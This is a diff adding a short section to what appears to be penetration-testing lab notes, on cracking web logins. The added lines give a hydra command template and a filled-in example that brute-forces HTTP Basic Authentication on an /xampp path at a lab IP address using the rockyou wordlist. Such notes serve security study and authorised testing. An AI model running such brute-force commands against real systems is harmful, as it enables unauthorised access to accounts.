@@ -666,6 +666,14 @@ $ wine exploit.exe
 
 # OTHER THINGS
 
+__Cracking Web Pages__
+
+Basic Authentication (e.g. /xampp logins):
+```bash
+$ hydra -l [username] -P [password file] -s [port] [target] [method] [path]
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 10.11.1.223 http-get /xampp
+```
+
 __Cracking Hashes__
 
 Useful Websites (has worked before):
